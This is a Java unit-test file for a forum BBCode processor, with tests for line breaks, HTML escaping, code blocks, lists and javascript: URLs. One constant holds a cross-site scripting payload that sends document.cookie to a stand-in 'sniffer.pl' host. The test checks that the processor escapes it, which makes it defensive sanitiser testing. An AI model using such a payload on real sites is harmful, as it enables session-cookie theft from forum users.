package org.javabb.bbcode;

import java.sql.SQLException;

import static org.junit.Assert.assertEquals;
import org.junit.Test;

import ru.org.linux.util.BadURLException;

public class BBCodeTest {
  private static final String LINE_BREAK_TEST = "test\ntest\n\ntest";
  private static final String LINE_BREAK_RESULT = "test\ntest<p>test";
  
  private static final String TAG_ESCAPE_TEST = "<br>";
  private static final String TAG_ESCAPE_RESULT = "&lt;br&gt;";

  private static final String JAVASCRIPT_URL = "[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]Test[/url]";

  private static final String LIST_TEST="[list][*]1[*]2[/list]";
  private static final String LIST_RESULT="<ul><li>1<li>2</ul>";

  private static final String BADLIST_TEST="[list]0[*]1[*]2[/list]";
  private static final String BADLIST_RESULT="<ul><li>1<li>2</ul>";

  @Test
  public void testLineBreak() throws BadURLException, SQLException {
    BBCodeProcessor proc = new BBCodeProcessor();

    String result = proc.preparePostText(null, LINE_BREAK_TEST);

    assertEquals(LINE_BREAK_RESULT, result);
  }

  @Test
  public void testTagExcape() throws BadURLException, SQLException {
    BBCodeProcessor proc = new BBCodeProcessor();

    String result = proc.preparePostText(null, TAG_ESCAPE_TEST);

    assertEquals(TAG_ESCAPE_RESULT, result);
  }

  @Test
  public void testJavascriptURL() throws BadURLException, SQLException {
    BBCodeProcessor proc = new BBCodeProcessor();

    String result = proc.preparePostText(null, JAVASCRIPT_URL);

    assertEquals("<s>javascript:var c=new Image();c.src=&quot;http://127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s>", result);
  }

  @Test
  public void testCodeExcape() throws BadURLException, SQLException {
    BBCodeProcessor proc = new BBCodeProcessor();

    String result = proc.preparePostText(null, "[code]\"code&code\"[/code]");

    assertEquals("<div class=\"code\">&quot;code&amp;code&quot;</div>", result);
  }

  @Test
  public void testList() throws BadURLException, SQLException {
    BBCodeProcessor proc = new BBCodeProcessor();

    String result = proc.preparePostText(null, LIST_TEST);

    assertEquals(LIST_RESULT, result);
  }

  @Test
  public void testBadList() throws BadURLException, SQLException {
    BBCodeProcessor proc = new BBCodeProcessor();

    String result = proc.preparePostText(null, BADLIST_TEST);

    assertEquals(BADLIST_RESULT, result);
  }
}
